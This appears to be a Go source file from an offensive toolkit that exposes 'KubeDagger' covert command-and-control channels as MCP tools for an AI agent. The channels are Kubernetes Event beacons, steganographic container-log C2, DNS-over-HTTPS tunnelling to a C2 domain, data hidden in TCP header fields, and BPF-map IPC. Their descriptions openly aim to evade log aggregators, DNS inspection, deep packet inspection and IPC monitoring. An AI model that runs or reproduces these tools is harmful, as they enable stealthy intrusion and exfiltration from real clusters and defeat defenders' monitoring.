package kubedagger

import (
	"context"
	"encoding/json"
	"fmt"
	"strings"

	"github.com/yasindce1998/redhands/pkg/executor"
	"github.com/yasindce1998/redhands/pkg/mcp"
)

// K8s Event C2

type K8sEventC2Input struct {
	Namespace string `json:"namespace,omitempty"`
	Beacon    string `json:"beacon,omitempty"`
}

type K8sEventC2Tool struct {
	exec executor.Executor
}

func NewK8sEventC2(exec executor.Executor) *K8sEventC2Tool {
	return &K8sEventC2Tool{exec: exec}
}

func (t *K8sEventC2Tool) Name() string { return "kubedagger_k8s_event_c2" }

func (t *K8sEventC2Tool) Description() string {
	return "Use Kubernetes Events as a covert C2 beacon channel. The agent periodically creates innocuous-looking event objects in the target namespace and reads operator instructions encoded within them, blending with normal cluster event traffic."
}

func (t *K8sEventC2Tool) InputSchema() json.RawMessage {
	return json.RawMessage(`{
		"type": "object",
		"properties": {
			"namespace": {
				"type": "string",
				"description": "Namespace for event objects (default: default)"
			},
			"beacon": {
				"type": "string",
				"description": "Beacon interval as a Go duration string, e.g. '30s' (default: 30s)"
			}
		}
	}`)
}

func (t *K8sEventC2Tool) Execute(ctx context.Context, params json.RawMessage) (*mcp.ToolResult, error) {
	var input K8sEventC2Input
	if err := json.Unmarshal(params, &input); err != nil {
		return errorResult("invalid input: " + err.Error()), nil
	}

	if err := validateNamespace(input.Namespace); err != nil {
		return errorResult(err.Error()), nil
	}
	if err := validateSafeString(input.Beacon, "beacon"); err != nil {
		return errorResult(err.Error()), nil
	}

	args := []string{"k8s-event-c2"}
	if input.Namespace != "" {
		args = append(args, "--namespace", input.Namespace)
	}
	if input.Beacon != "" {
		args = append(args, "--beacon", input.Beacon)
	}

	result, err := t.exec.Run(ctx, "kubedagger-client", args...)
	if err != nil {
		stderr := ""
		if result != nil {
			stderr = string(result.Stderr)
		}
		return errorResult(fmt.Sprintf("kubedagger k8s-event-c2 failed: %s\n%s", err.Error(), stderr)), nil
	}

	output := strings.TrimSpace(string(result.Stdout))
	var sb strings.Builder
	sb.WriteString("## KubeDagger K8s Event C2\n\n")
	if output == "" {
		sb.WriteString("Channel active.\n")
	} else {
		sb.WriteString("```\n")
		sb.WriteString(output)
		sb.WriteString("\n```\n")
	}

	return &mcp.ToolResult{
		Content: []mcp.ContentBlock{{Type: "text", Text: sb.String()}},
	}, nil
}

// Container Log C2

type ContainerLogC2Input struct {
	Container string `json:"container"`
	Encoding  string `json:"encoding,omitempty"`
}

type ContainerLogC2Tool struct {
	exec executor.Executor
}

func NewContainerLogC2(exec executor.Executor) *ContainerLogC2Tool {
	return &ContainerLogC2Tool{exec: exec}
}

func (t *ContainerLogC2Tool) Name() string { return "kubedagger_container_log_c2" }

func (t *ContainerLogC2Tool) Description() string {
	return "Use container stdout/stderr logs as a covert C2 channel. Steganographically encodes commands in container log output using whitespace, unicode, or base85 steganography, appearing normal to log aggregators while carrying C2 payloads."
}

func (t *ContainerLogC2Tool) InputSchema() json.RawMessage {
	return json.RawMessage(`{
		"type": "object",
		"properties": {
			"container": {
				"type": "string",
				"description": "Target container to use for the log channel (required)"
			},
			"encoding": {
				"type": "string",
				"enum": ["base85", "whitespace", "unicode"],
				"description": "Steganographic encoding for the C2 data (default: base85)"
			}
		},
		"required": ["container"]
	}`)
}

func (t *ContainerLogC2Tool) Execute(ctx context.Context, params json.RawMessage) (*mcp.ToolResult, error) {
	var input ContainerLogC2Input
	if err := json.Unmarshal(params, &input); err != nil {
		return errorResult("invalid input: " + err.Error()), nil
	}

	if input.Container == "" {
		return errorResult("container is required"), nil
	}
	if err := validateSafeString(input.Container, "container"); err != nil {
		return errorResult(err.Error()), nil
	}

	args := []string{"container-log-c2", "--container", input.Container}
	if input.Encoding != "" {
		args = append(args, "--encoding", input.Encoding)
	}

	result, err := t.exec.Run(ctx, "kubedagger-client", args...)
	if err != nil {
		stderr := ""
		if result != nil {
			stderr = string(result.Stderr)
		}
		return errorResult(fmt.Sprintf("kubedagger container-log-c2 failed: %s\n%s", err.Error(), stderr)), nil
	}

	output := strings.TrimSpace(string(result.Stdout))
	var sb strings.Builder
	sb.WriteString("## KubeDagger Container Log C2\n\n")
	if output == "" {
		sb.WriteString("Channel active.\n")
	} else {
		sb.WriteString("```\n")
		sb.WriteString(output)
		sb.WriteString("\n```\n")
	}

	return &mcp.ToolResult{
		Content: []mcp.ContentBlock{{Type: "text", Text: sb.String()}},
	}, nil
}

// DoH C2

type DoHC2Input struct {
	Resolver string `json:"resolver,omitempty"`
	Domain   string `json:"domain"`
}

type DoHC2Tool struct {
	exec executor.Executor
}

func NewDoHC2(exec executor.Executor) *DoHC2Tool {
	return &DoHC2Tool{exec: exec}
}

func (t *DoHC2Tool) Name() string { return "kubedagger_doh_c2" }

func (t *DoHC2Tool) Description() string {
	return "DNS-over-HTTPS C2 channel that tunnels commands through encrypted DoH queries to public resolvers. Traffic appears as normal HTTPS to DNS services, bypassing DNS inspection and network policies."
}

func (t *DoHC2Tool) InputSchema() json.RawMessage {
	return json.RawMessage(`{
		"type": "object",
		"properties": {
			"resolver": {
				"type": "string",
				"enum": ["cloudflare", "google"],
				"description": "DoH resolver to use (default: cloudflare)"
			},
			"domain": {
				"type": "string",
				"description": "C2 domain for DNS tunneling (required)"
			}
		},
		"required": ["domain"]
	}`)
}

func (t *DoHC2Tool) Execute(ctx context.Context, params json.RawMessage) (*mcp.ToolResult, error) {
	var input DoHC2Input
	if err := json.Unmarshal(params, &input); err != nil {
		return errorResult("invalid input: " + err.Error()), nil
	}

	if input.Domain == "" {
		return errorResult("domain is required"), nil
	}
	if err := validateSafeString(input.Resolver, "resolver"); err != nil {
		return errorResult(err.Error()), nil
	}
	if err := validateSafeString(input.Domain, "domain"); err != nil {
		return errorResult(err.Error()), nil
	}

	args := []string{"doh-c2", "--domain", input.Domain}
	if input.Resolver != "" {
		args = append(args, "--resolver", input.Resolver)
	}

	result, err := t.exec.Run(ctx, "kubedagger-client", args...)
	if err != nil {
		stderr := ""
		if result != nil {
			stderr = string(result.Stderr)
		}
		return errorResult(fmt.Sprintf("kubedagger doh-c2 failed: %s\n%s", err.Error(), stderr)), nil
	}

	output := strings.TrimSpace(string(result.Stdout))
	var sb strings.Builder
	sb.WriteString("## KubeDagger DoH C2\n\n")
	if output == "" {
		sb.WriteString("Channel active.\n")
	} else {
		sb.WriteString("```\n")
		sb.WriteString(output)
		sb.WriteString("\n```\n")
	}

	return &mcp.ToolResult{
		Content: []mcp.ContentBlock{{Type: "text", Text: sb.String()}},
	}, nil
}

// TCP Stego

type TCPStegoInput struct {
	Data          string `json:"data,omitempty"`
	Dest          string `json:"dest,omitempty"`
	BitsPerPacket string `json:"bits_per_packet,omitempty"`
}

type TCPStegoTool struct {
	exec executor.Executor
}

func NewTCPStego(exec executor.Executor) *TCPStegoTool {
	return &TCPStegoTool{exec: exec}
}

func (t *TCPStegoTool) Name() string { return "kubedagger_tcp_stego" }

func (t *TCPStegoTool) Description() string {
	return "Hide C2 data in TCP/IP header fields using steganography. Data is embedded in legitimate-looking TCP flows to an ip:port destination, passing deep packet inspection that inspects payloads only."
}

func (t *TCPStegoTool) InputSchema() json.RawMessage {
	return json.RawMessage(`{
		"type": "object",
		"properties": {
			"data": {
				"type": "string",
				"description": "Data to embed in TCP headers"
			},
			"dest": {
				"type": "string",
				"description": "Destination as ip:port (e.g. '10.0.0.1:443')"
			},
			"bits_per_packet": {
				"type": "string",
				"enum": ["2", "4"],
				"description": "Stego bits carried per packet (default: 2)"
			}
		}
	}`)
}

func (t *TCPStegoTool) Execute(ctx context.Context, params json.RawMessage) (*mcp.ToolResult, error) {
	var input TCPStegoInput
	if err := json.Unmarshal(params, &input); err != nil {
		return errorResult("invalid input: " + err.Error()), nil
	}

	if err := validateSafeString(input.Data, "data"); err != nil {
		return errorResult(err.Error()), nil
	}
	if err := validateIPPort(input.Dest); err != nil {
		return errorResult(err.Error()), nil
	}

	args := []string{"tcp-stego"}
	if input.Data != "" {
		args = append(args, "--data", input.Data)
	}
	if input.Dest != "" {
		args = append(args, "--dest", input.Dest)
	}
	if input.BitsPerPacket != "" {
		args = append(args, "--bits-per-packet", input.BitsPerPacket)
	}

	result, err := t.exec.Run(ctx, "kubedagger-client", args...)
	if err != nil {
		stderr := ""
		if result != nil {
			stderr = string(result.Stderr)
		}
		return errorResult(fmt.Sprintf("kubedagger tcp-stego failed: %s\n%s", err.Error(), stderr)), nil
	}

	output := strings.TrimSpace(string(result.Stdout))
	var sb strings.Builder
	sb.WriteString("## KubeDagger TCP Stego\n\n")
	if output == "" {
		sb.WriteString("Channel active.\n")
	} else {
		sb.WriteString("```\n")
		sb.WriteString(output)
		sb.WriteString("\n```\n")
	}

	return &mcp.ToolResult{
		Content: []mcp.ContentBlock{{Type: "text", Text: sb.String()}},
	}, nil
}

// BPF IPC

type BPFIPCInput struct {
	Action  string `json:"action,omitempty"`
	Channel string `json:"channel,omitempty"`
	Message string `json:"message,omitempty"`
}

type BPFIPCTool struct {
	exec executor.Executor
}

func NewBPFIPC(exec executor.Executor) *BPFIPCTool {
	return &BPFIPCTool{exec: exec}
}

func (t *BPFIPCTool) Name() string { return "kubedagger_bpf_ipc" }

func (t *BPFIPCTool) Description() string {
	return "Use BPF maps as an inter-process communication channel between kernel-space eBPF programs and userspace agents. Provides a covert shared-memory channel invisible to standard IPC monitoring tools."
}

func (t *BPFIPCTool) InputSchema() json.RawMessage {
	return json.RawMessage(`{
		"type": "object",
		"properties": {
			"action": {
				"type": "string",
				"enum": ["send", "recv", "list"],
				"description": "BPF IPC action (default: send)"
			},
			"channel": {
				"type": "string",
				"description": "BPF map channel name for IPC (default: default)"
			},
			"message": {
				"type": "string",
				"description": "Message to send on the channel (for action=send)"
			}
		}
	}`)
}

func (t *BPFIPCTool) Execute(ctx context.Context, params json.RawMessage) (*mcp.ToolResult, error) {
	var input BPFIPCInput
	if err := json.Unmarshal(params, &input); err != nil {
		return errorResult("invalid input: " + err.Error()), nil
	}

	if err := validateSafeString(input.Channel, "channel"); err != nil {
		return errorResult(err.Error()), nil
	}
	if err := validateSafeString(input.Message, "message"); err != nil {
		return errorResult(err.Error()), nil
	}

	args := []string{"bpf-ipc"}
	if input.Action != "" {
		args = append(args, "--action", input.Action)
	}
	if input.Channel != "" {
		args = append(args, "--channel", input.Channel)
	}
	if input.Message != "" {
		args = append(args, "--message", input.Message)
	}

	result, err := t.exec.Run(ctx, "kubedagger-client", args...)
	if err != nil {
		stderr := ""
		if result != nil {
			stderr = string(result.Stderr)
		}
		return errorResult(fmt.Sprintf("kubedagger bpf-ipc failed: %s\n%s", err.Error(), stderr)), nil
	}

	output := strings.TrimSpace(string(result.Stdout))
	var sb strings.Builder
	sb.WriteString("## KubeDagger BPF IPC\n\n")
	if output == "" {
		sb.WriteString("IPC channel active.\n")
	} else {
		sb.WriteString("```\n")
		sb.WriteString(output)
		sb.WriteString("\n```\n")
	}

	return &mcp.ToolResult{
		Content: []mcp.ContentBlock{{Type: "text", Text: sb.String()}},
	}, nil
}
